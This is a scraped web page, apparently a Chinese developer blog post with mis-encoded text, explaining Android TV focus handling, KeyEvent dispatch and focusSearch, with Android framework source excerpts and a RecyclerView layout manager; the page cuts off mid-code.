                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f9a6ac0bf2e4a4c8a9743e1660f3e56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pe25YWJ5bCR5bm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449294&amp;x-signature=3TrzgICa%2BUZmyf05oA6PfjPk4Lo%3D" alt="ä¼ä¸šå¾®ä¿¡20260108-114942@2x.png" loading="lazy"/></p>
<p>åœ¨ç§»åŠ¨è®¾å¤‡ï¼ˆå¦‚æ‰‹æœºã€å¹³æ¿ï¼‰ä¸Šï¼Œç”¨æˆ·ä¸»è¦é€šè¿‡è§¦æ‘¸å±ä¸åº”ç”¨äº¤äº’ï¼Œæ‰‹æŒ‡ç‚¹å‡»å“ªé‡Œï¼Œç„¦ç‚¹å°±åœ¨å“ªé‡Œã€‚ä½†åœ¨ç”µè§†è¿™ç§å¤§å±ã€è¿œè·ç¦»äº¤äº’çš„åœºæ™¯ä¸‹ï¼Œè§¦æ‘¸ä¸å†é€‚ç”¨ï¼Œç”¨æˆ·ä¸»è¦ä½¿ç”¨é¥æ§å™¨ï¼ˆæ–¹å‘é”®ã€ç¡®è®¤é”®ã€è¿”å›é”®ç­‰ï¼‰è¿›è¡Œå¯¼èˆªã€‚</p>
<p>å®é™…ä¸Šï¼Œè¿™ç§äº¤äº’é€šè¿‡KeyEventï¼Œè€ŒTVçš„ç„¦ç‚¹å’ŒKeyEventæœ‰ç€éå¸¸ç´§å¯†çš„å…³ç³»ï¼Œé€šå¸¸æ„ä¹‰ä¸Šï¼ŒKeyEventè§¦å‘Focusçš„å˜åŒ–ã€‚åœ¨Android åº”ç”¨å¼€å‘ä¸­ï¼Œç„¦ç‚¹+KeyEventæ¨¡å¼çš„æ¡†æ¶ä¸‹ï¼Œäº¤äº’éš¾åº¦å…¶å®è¦è¶…è¿‡è§¦æ‘¸äº‹ä»¶ã€‚</p>
<h2 data-id="heading-1">å¸¸è§é—®é¢˜</h2>
<p>ä¸è¿‡ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæœ€è®©äººå¤´ç–¼çš„â€å¾ˆéš¾â€œæ§åˆ¶èµ°å‘ï¼Œä¸è¿‡å¥½æ¶ˆæ¯æ˜¯ï¼ŒAndroidå®˜æ–¹æ¨å‡ºçš„Compose UIåœ¨è¿™æ–¹é¢è¿›æ­¥å¾ˆå¤šï¼Œä½¿å¾—ç„¦ç‚¹è½¬ç§»ç›®æ ‡æ›´åŠ æ˜ç¡®ï¼Œç„¦ç‚¹é—®é¢˜è¦æ¯”ä¼ ç»ŸViewå¼€å‘çš„å°‘å¾ˆå¤šã€‚</p>
<p>ä½œä¸ºâ€œè¿œå¤UIçš„appâ€çš„å¼€å‘è€…ï¼Œæˆ‘ä»¬è‡ªç„¶æ— æ³•ç«‹åˆ»è½¬å‘Compose UIå¼€å‘ï¼Œè¿™ä¹Ÿæ˜¯è¡Œä¸šç°çŠ¶äº†å§ã€‚å¥½äº†ï¼Œè¿›å…¥ä¸»é¢˜ï¼Œæˆ‘ä»¬ä»Šå¤©é‡ç‚¹æ€»ç»“ä¸€ä¸‹ç„¦ç‚¹çš„ç›¸å…³é—®é¢˜ã€‚</p>
<h3 data-id="heading-2">ç„¦ç‚¹åˆ†é…</h3>
<p>è°ˆåˆ°ç„¦ç‚¹åˆ†é…ï¼Œæˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä¸‹KeyEventçš„äº‹ä»¶ä¼ é€’ï¼Œå…¶å®å’Œè§¦æ‘¸å±ç›¸æ¯”,KeyEventä¼ é€’è¦ç›¸å¯¹ç®€å•ä¸€ç‚¹ï¼ŒKeyEventçš„ä¸»è¦ä¼ é€’æ–¹å‘æ˜¯å‘â€œå¸¦ç„¦ç‚¹çš„Viewâ€ä¼ é€’ï¼ŒåŸºæœ¬ä¸å­˜åœ¨åˆ†å‘é€»è¾‘ï¼Œå½“ç„¶ï¼Œã€ä¸Šã€‘ã€ä¸‹ã€‘ã€å·¦ã€‘ã€å³ã€‘æ–¹å‘é”®æ˜¯é™¤å¤–çš„ã€‚</p>
<h4 data-id="heading-3">äº‹ä»¶ç±»å‹æ€»ç»“</h4>
<ul>
<li>æ™®é€šäº‹ä»¶ï¼š ç›´æ¥é¡ºç€"ç„¦ç‚¹é“¾"å‘å¸¦ç„¦ç‚¹çš„Viewä¼ é€’</li>
<li>ç‚¹å‡»äº‹ä»¶ï¼š å¿«é€Ÿç‚¹å‡»ã€ç¡®è®¤ã€‘ã€å›è½¦ã€‘ã€Centerã€‘å°±ä¼šå°†äº‹ä»¶è½¬ä¸ºTouchäº‹ä»¶ï¼Œæœ€ç»ˆè§¦å‘ç‚¹å‡»äº‹ä»¶ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯å…¶ä»–æŒ‰é”®ï¼Œæ˜¯ä¸ä¼šè½¬åŒ–ä¸ºTouchäº‹ä»¶çš„</li>
<li>é•¿æŒ‰äº‹ä»¶ï¼šé•¿æŒ‰ã€ç¡®è®¤ã€‘ã€å›è½¦ã€‘ã€Centerã€‘å°±ä¼šå°†äº‹ä»¶è½¬ä¸ºTouchäº‹ä»¶ï¼Œæœ€ç»ˆè§¦å‘é•¿æŒ‰äº‹ä»¶ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯å…¶ä»–æŒ‰é”®ï¼Œä¼šè§¦å‘å¤šæ¬¡è¿ç»­ç‚¹å‡»ï¼Œå¹¶ä¸å­˜åœ¨é•¿æŒ‰äº‹ä»¶</li>
<li>æ–¹å‘æŒ‰é”®ï¼šå¸¦æ–¹å‘çš„æŒ‰é”®è¢«ç‚¹å‡»åï¼Œé¦–å…ˆé¡ºç€â€ç„¦ç‚¹é“¾â€œå‘å¸¦ç„¦ç‚¹çš„Viewï¼Œå¦‚æœæ²¡æœ‰å¤„ç†ï¼Œåˆ™è¿›å…¥åˆ†å‘æµç¨‹ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå…¶ä»–æŒ‰é”®æ²¡æœ‰åˆ†å‘æµç¨‹çš„ã€‚</li>
</ul>
<h4 data-id="heading-4">ç„¦ç‚¹é“¾</h4>
<p>å¥½å§ï¼Œä¸Šé¢çš„æè¿°ä¸­ï¼Œæœ‰ä¸ªã€ç„¦ç‚¹é“¾ã€‘ï¼Œè¿™æ˜¯æˆ‘ä¸ªäººçš„å«æ³•ï¼Œæˆ‘ç¡®å®ä¸çŸ¥é“åˆ«äººä¼šæ€ä¹ˆèµ·åå­—ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯ç„¦ç‚¹é“¾å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ä¸€ä¸ªUIç•Œé¢ä¸­ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªViewä¼šæœ‰ç„¦ç‚¹ï¼Œä½†æ˜¯ï¼ŒæŒ‰ç…§ä¼ ç»Ÿçš„æƒ³æ³•ï¼Œè®©æ‰€æœ‰Viewå»findFocusæŸ¥è¯¢è¿™ä¸ªç„¦ç‚¹çš„æ—¶å€™ï¼Œè¦ä¹ˆæ˜¯éå†Viewæ ‘ï¼Œä½†Androidæ˜¯å¹¶æ²¡æœ‰ï¼Œæ¯•ç«ŸViewå¢å¤šä¼šæ˜¾è‘—æå‡æŸ¥è¯¢æ—¶é—´ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¯èƒ½æœ‰äººä¼šæƒ³ï¼Œä¿å­˜æˆå•ä¾‹ä¸å¥½ä¹ˆï¼Œä½†å‡ºäºMemoryLeakçš„è€ƒè™‘ï¼Œå®˜æ–¹å¹¶ä¸è®¤å¯è¿™ç§åšæ³•ï¼Œåè€Œé€‰æ‹©äº†å¦ä¸€ç§åšæ³•ï¼Œé‚£å°±æ˜¯ã€ç„¦ç‚¹é“¾ã€‘ã€‚</p>
<p>åŸç†æ˜¯åœ¨æ¯ä¸€ä¸ªçˆ¶å¸ƒå±€ä¸­ï¼Œå®šä¹‰ä¸€ä¸ªmFocusedå˜é‡ï¼Œä¿å­˜ä¸‹ä¸€çº§è·¯å¾„ViewèŠ‚ç‚¹ï¼Œæœ€ç»ˆï¼Œå½“æŸViewèšç„¦æ—¶ï¼Œå°±ä¼šå½¢æˆä¸‹é¢çš„é“¾æ¡</p>
<blockquote>
<p>mFocused-&gt;mFocused-&gt;mFocused-&gt;mFocused</p>
</blockquote>
<p>åœ¨ç„¦ç‚¹é“¾ä¸­ï¼Œåªæœ‰æœ«ç«¯çš„mFocusedæ‰å…·å¤‡ç„¦ç‚¹ï¼Œé€šè¿‡è¿™ç§é“¾å¼çš„é“¾æ¥ï¼Œæœ‰æ•ˆå‡å°‘äº†æŸ¥è¯¢æ—¶é—´ï¼Œä¹Ÿèƒ½å®Œç¾çš„é¿å…MemoryLeak</p>
<p>ä¸‹é¢ï¼Œåœ¨å›å¤´çœ‹ViewGroupçš„æºç ï¼Œä½ æ˜¯ä¸æ˜¯å°±èƒ½æƒ³å¾—é€šKeyEventçš„äº‹ä»¶ä¼ é€’æ–¹å¼äº†</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">dispatchKeyEvent</span><span class="hljs-params">(KeyEvent event)</span> {
    <span class="hljs-keyword">if</span> (mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onKeyEvent(event, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span> ((mPrivateFlags &amp; (PFLAG_FOCUSED | PFLAG_HAS_BOUNDS))
            == (PFLAG_FOCUSED | PFLAG_HAS_BOUNDS)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">super</span>.dispatchKeyEvent(event)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mFocused != <span class="hljs-literal">null</span> &amp;&amp; (mFocused.mPrivateFlags &amp; PFLAG_HAS_BOUNDS)
            == PFLAG_HAS_BOUNDS) {
        <span class="hljs-keyword">if</span> (mFocused.dispatchKeyEvent(event)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }

    <span class="hljs-keyword">if</span> (mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onUnhandledEvent(event, <span class="hljs-number">1</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>æœ¬ç¯‡æˆ‘ä»¬é‡ç‚¹æ˜¯æ–¹å‘æŒ‰é”®çš„å¤„ç†ã€‚</p>
<h4 data-id="heading-5">ViewRootImpl KeyEventäº‹ä»¶</h4>
<p>ä¸è§¦æ‘¸äº‹ä»¶ä¸åŒçš„æ˜¯ï¼ŒKeyEventçš„æ–¹å‘æŒ‰é”®å¯èƒ½éœ€è¦ä¸¤æ¬¡å—åˆ°ViewRootImplçš„æ§åˆ¶ï¼Œç¬¬äºŒæ¬¡ä¾èµ–ç¬¬ä¸€æ¬¡çš„å¤„ç†é€»è¾‘ï¼Œå¦‚æœç¬¬ä¸€æ¬¡æ²¡æœ‰å¤„ç†ï¼Œåˆ™ç”±ViewRootImplå‘èµ·ç„¦ç‚¹æŸ¥è¯¢ã€‚</p>
<p>ç¬¬ä¸€æ¬¡ï¼Œå’Œæ™®é€šçš„äº‹ä»¶ä¸€æ ·ï¼Œé¡ºç€ç„¦ç‚¹é“¾å‘å¸¦ç„¦ç‚¹çš„ä¼ é€’
ç¬¬äºŒæ¬¡ï¼Œå¦‚æœç¬¬ä¸€æ¬¡æ²¡æœ‰æ–¹å‘é”®å¤„ç†ACTION_DOWNäº‹ä»¶åˆ™å‘èµ·ç„¦ç‚¹æœç´¢ï¼ˆæ–¹å‘é”®ä»¥å¤–çš„å…¶ä»–äº‹ä»¶ä¸¢å¼ƒæˆ–è€…ç»§ç»­å…³æ³¨ACTION_UPçš„å›è°ƒï¼‰</p>
<p>è¿™éƒ¨åˆ†çš„å…·ä½“é€»è¾‘å‚è€ƒViewRootImplç›¸å…³é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java">android.view.ViewRootImpl.ViewPostImeInputStage#processKeyEvent
</code></pre>
<p>ä¸‹é¢æˆ‘ä»¬æˆ‘ä»¬äº†è§£ä¸‹ç„¦ç‚¹çš„åˆ†å‘</p>
<h3 data-id="heading-6">ç„¦ç‚¹åˆ†å‘</h3>
<p>å®é™…ä¸Šï¼Œä¸å…¶è¯´æ˜¯ç„¦ç‚¹çš„åˆ†å‘ï¼Œä¸å¦‚è¯´æ˜¯æ–¹å‘æŒ‰é”®çš„åˆ†å‘ï¼Œè°ƒåº¦é€»è¾‘å‚è€ƒ ViewRootImplæºç </p>
<p>åœ¨è¿™éƒ¨åˆ†æºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å¾ˆå¤šç„¦ç‚¹äº‹ä»¶çš„è½¬åŒ–ï¼Œå¦å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ²¡æœ‰DecorViewèšç„¦æ—¶ï¼ŒDecorViewé»˜è®¤ä¼šè°ƒç”¨restoreDefaultFocusç»™è‡ªèº«ç„¦ç‚¹ã€‚</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">performFocusNavigation</span><span class="hljs-params">(KeyEvent event)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">direction</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">switch</span> (event.getKeyCode()) {
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_LEFT:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_LEFT;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_RIGHT:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_RIGHT;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_UP:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_UP;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_DPAD_DOWN:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_DOWN;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> KeyEvent.KEYCODE_TAB:
            <span class="hljs-keyword">if</span> (event.hasNoModifiers()) {
                direction = View.FOCUS_FORWARD;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event.hasModifiers(KeyEvent.META_SHIFT_ON)) {
                direction = View.FOCUS_BACKWARD;
            }
            <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">if</span> (direction != <span class="hljs-number">0</span>) {
        <span class="hljs-type">View</span> <span class="hljs-variable">focused</span> <span class="hljs-operator">=</span> mView.findFocus();
        <span class="hljs-keyword">if</span> (focused != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">View</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> focused.focusSearch(direction);
            <span class="hljs-keyword">if</span> (v != <span class="hljs-literal">null</span> &amp;&amp; v != focused) {
                <span class="hljs-comment">// do the math the get the interesting rect</span>
                <span class="hljs-comment">// of previous focused into the coord system of</span>
                <span class="hljs-comment">// newly focused view</span>
                focused.getFocusedRect(mTempRect);
                <span class="hljs-keyword">if</span> (mView <span class="hljs-keyword">instanceof</span> ViewGroup) {
                    ((ViewGroup) mView).offsetDescendantRectToMyCoords(
                            focused, mTempRect);
                    ((ViewGroup) mView).offsetRectIntoDescendantCoords(
                            v, mTempRect);
                }
                <span class="hljs-keyword">if</span> (v.requestFocus(direction, mTempRect)) {
                    playSoundEffect(SoundEffectConstants
                            .getContantForFocusDirection(direction));
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                }
            }

            <span class="hljs-comment">// Give the focused view a last chance to handle the dpad key.</span>
            <span class="hljs-keyword">if</span> (mView.dispatchUnhandledMove(focused, direction)) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (mView.restoreDefaultFocus()) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬è¦æ¸…æ¥šçš„ç‚¹æ˜¯ï¼Œä»»ä½•äº‹ä»¶ï¼ŒdispatchKeyEventæ˜¯å¿…é¡»è¦è°ƒç”¨çš„ï¼Œè€Œä¸”åœ¨Viewè·ç„¦ä¹‹å‰ä¼šè°ƒç”¨ï¼Œä¼¼ä¹è¿™é‡Œå¯ä»¥æ‹¦æˆªç„¦ç‚¹ï¼Œå…¶å®è¿™æ ·æƒ³ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ï¼Œæˆ‘è¿™é‡Œè¦è¯´çš„æ˜¯ï¼ŒfocusSearchå…¶å®è¦æ¯”dispatchKeyEventå¥½çš„å¤š</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼ŒdispatchKeyEventæœªå¤„ç†çš„æ–¹å‘äº‹ä»¶æ‰ä¼šç»™focusSearchï¼Œä½†æ˜¯ï¼Œå¾ˆå¤šäº‹ä»¶çš„å¤„ç†ä¸­ï¼Œå‡è®¾æˆ‘ä»¬æ‹¦æˆªdispatchKeyEventï¼Œå¯èƒ½é€ æˆå¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œå¦å¤–ï¼Œå¦‚æœç„¦ç‚¹é“¾å±‚çº§å¤ªæ·±ï¼Œä¸€äº›é¡¶éƒ¨Viewçš„dispatchKeyEventå¹¶ä¸èƒ½æ˜ç¡®çŸ¥é“å…·ä½“ç”±å“ªä¸ªViewå‘å…¶ä»–Viewè½¬æ¢ï¼Œä»¥åŠç„¦ç‚¹çˆ¶Viewçš„é€»è¾‘ï¼Œè´¸ç„¶å¤„ç†ï¼Œåè€Œå¢åŠ äº†å¤æ‚æ€§ï¼Œç›¸æ¯”è€Œè¨€focusSearchè·Ÿæ¥è¿‘å­Viewæœ¬èº«ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> View <span class="hljs-title function_">focusSearch</span><span class="hljs-params">(View focused, <span class="hljs-type">int</span> direction)</span> {
    <span class="hljs-keyword">if</span> (isRootNamespace()) {
        <span class="hljs-comment">// root namespace means we should consider ourselves the top of the</span>
        <span class="hljs-comment">// tree for focus searching; otherwise we could be focus searching</span>
        <span class="hljs-comment">// into other tabs.  see LocalActivityManager and TabHost for more info.</span>
        <span class="hljs-keyword">return</span> FocusFinder.getInstance().findNextFocus(<span class="hljs-built_in">this</span>, focused, direction);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mParent != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> mParent.focusSearch(focused, direction);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p>å› æ­¤ï¼Œæˆ‘ä»¬åœ¨focusSearchè¿™é‡Œæ‹¦æˆªå’Œåˆ†å‘ç„¦ç‚¹åº”è¯¥ä½œä¸ºé¦–é€‰ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ç›´ä¸ªè½¬ç§»æ–¹å¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> View <span class="hljs-title function_">focusSearch</span><span class="hljs-params">(<span class="hljs-type">int</span> direction)</span> {
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.focusSearchListener != <span class="hljs-literal">null</span>){
        <span class="hljs-type">View</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> findFocus();
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.focusSearchListener.onFocusSearch(current, direction);
        <span class="hljs-keyword">if</span>(view != <span class="hljs-literal">null</span>){
            <span class="hljs-keyword">return</span> view;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.focusSearch(direction);
}
</code></pre>
<h3 data-id="heading-7">RecyclerViewç„¦ç‚¹</h3>
<p>ReyclerViewæ˜¯éš¾åº¦æ›´é«˜çš„ç„¦ç‚¹å¤„ç†ç»„ä»¶ä¹‹ä¸€ï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬è¯´è¿‡ï¼ŒTVæ¨¡å¼åº”è¯¥æœ‰é™ä½¿ç”¨çŸ­åˆ—è¡¨ï¼Œé¿å…é•¿åˆ—è¡¨ï¼Œä½†å®é™…æ“ä½œä¸­ï¼Œä¸€äº›æ¡ç›®ä¹Ÿæ˜¯éå¸¸å¤šï¼Œéœ€è¦æŒ‰ç€é¥æ§å™¨ä¸æ–­è°ƒæ•´æ–¹å‘å’Œä½ç½®ï¼Œå¢åŠ äº†ç”¨æˆ·çš„å·¥ä½œé‡ã€‚</p>
<p>å½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬å®é™…å¼€å‘ä¸­ï¼Œä¸»è¦éœ€è¦å¤„ç†RecyclerView Itemä¸¢ç„¦é—®é¢˜</p>
<p>é¦–å…ˆï¼Œæˆ‘å¯èƒ½è‚¯å®šè¦é˜²æŠ–ï¼Œå°±æ˜¯é¿å…äº‹ä»¶æ–¹å‘äº‹ä»¶è§¦å‘è¿‡å¿«ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬éœ€è¦ç„¦ç‚¹Viewä»¥åŠç›¸é‚»çš„Viewå°½å¯èƒ½æ¼å‡ºï¼Œå½“ç„¶ï¼Œæœ€ç»ˆéœ€è¦å®šä¹‰LayoutManager</p>
<p>ä¸‹é¢æˆ‘ä»¬æ€»ç»“äº†ä¸¤ç§ä¸¤ç§å¸¸è§çš„åœºæ™¯</p>
<h4 data-id="heading-8">èšç„¦ItemViewå±…ä¸­</h4>
<p>è¿™éƒ¨åˆ†ç›¸å¯¹ç®€å•ï¼Œä¸»è¦æ˜¯å°†èšç„¦çš„Viewç§»åŠ¨åˆ°RecyclerViewä¸­é—´ä½ç½®ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CenterLayoutManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearLayoutManager</span> {

    <span class="hljs-comment">// ç›‘å¬å™¨æ¥å£ï¼Œç”¨äºåœ¨ Item å±…ä¸­æ—¶è¿›è¡Œé¢å¤–æ“ä½œ (å¯é€‰)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OnCenterItemFocusListener</span> {
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocus</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span>;
    }

    <span class="hljs-keyword">private</span> RecyclerView recyclerView;
    <span class="hljs-keyword">private</span> OnCenterItemFocusListener onCenterItemFocusListener;

    <span class="hljs-comment">// é˜²æ­¢é€’å½’è°ƒç”¨çš„ä¿æŠ¤æ ‡å¿—</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isScrollingToCenter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"CenterLayoutManager"</span>;

    <span class="hljs-comment">// ã€å…³é”®ä¿®æ”¹ 1ã€‘å°†ç›‘å¬å™¨ä½œä¸ºæˆå‘˜å˜é‡ï¼Œä»¥ä¾¿åœ¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­å¼•ç”¨å’Œç§»é™¤</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RecyclerView.OnScrollListener scrollStateListener;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CenterLayoutManager</span><span class="hljs-params">(Context context, <span class="hljs-type">int</span> orientation, <span class="hljs-type">boolean</span> reverseLayout)</span> {
        <span class="hljs-built_in">super</span>(context, orientation, reverseLayout);

        <span class="hljs-comment">// åˆå§‹åŒ–æ»šåŠ¨çŠ¶æ€ç›‘å¬å™¨</span>
        scrollStateListener = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrollStateChanged</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> RecyclerView recyclerView, <span class="hljs-type">int</span> newState)</span> {
                <span class="hljs-built_in">super</span>.onScrollStateChanged(recyclerView, newState);

                <span class="hljs-comment">// ä»…åœ¨æ»šåŠ¨é™æ­¢æ—¶ (IDLE) æ£€æŸ¥æ˜¯å¦éœ€è¦é‡ç½®æ ‡å¿—</span>
